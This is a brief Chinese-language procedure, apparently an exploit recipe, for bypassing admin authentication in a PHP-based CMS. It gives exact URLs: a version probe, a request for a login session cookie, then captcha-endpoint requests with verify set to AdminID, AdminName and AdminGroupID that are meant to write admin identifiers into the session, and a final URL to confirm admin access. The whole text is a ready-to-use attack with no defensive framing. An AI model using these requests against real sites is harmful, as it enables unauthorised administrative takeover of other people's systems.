1.访问 /index.php/base?a=Version 判断版本

2.访问 /index.php/Admin/public/Login 生成一个 PHPSESSID

3.访问下面两条url 绕过session检测

```
/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminID&type=png
/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminName&type=png
```
4.访问 ```/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminGroupID&type=png```

5. 访问  ```/index.php/Admin/Public/AdminLeft/MenuTopID/7 判断PHPSESSID是否有效```
